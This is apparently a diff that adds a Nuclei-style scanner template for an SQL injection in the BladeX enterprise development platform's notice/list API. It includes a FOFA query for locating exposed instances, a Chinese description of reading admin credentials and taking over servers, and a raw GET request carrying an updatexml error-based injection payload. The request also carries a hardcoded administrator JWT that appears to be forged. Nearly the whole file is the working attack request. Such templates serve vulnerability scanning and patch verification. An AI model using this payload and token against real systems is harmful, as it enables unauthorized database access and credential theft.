@@ -1,0 +1,32 @@
+id: BladeX-notice_list-sql
+
+info:
+  name: "BladeX企业级开发平台 notice 接口SQL注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="https://bladex.vip"
+      BladeX企业级开发平台在notice/list接口实现中存在SQL注入缺陷，攻击者可通过构造恶意SQL查询实现数据库敏感信息获取。该漏洞允许攻击者读取数据库中的结构化数据（包括但不限于管理员凭证、用户隐私信息等），在具备操作系统写权限的场景下，可能通过数据库扩展功能或文件写入机制植入恶意代码，最终达成对目标服务器的控制。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140977475
+  tags: BladeX企业级开发平台
+
+
+http:
+- raw:
+  - |
+    GET /api/blade-desk/notice/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
+    Host: {{Hostname}}
+    Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
+
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'java.sql.SQLException'
+
+
+
+
+
+
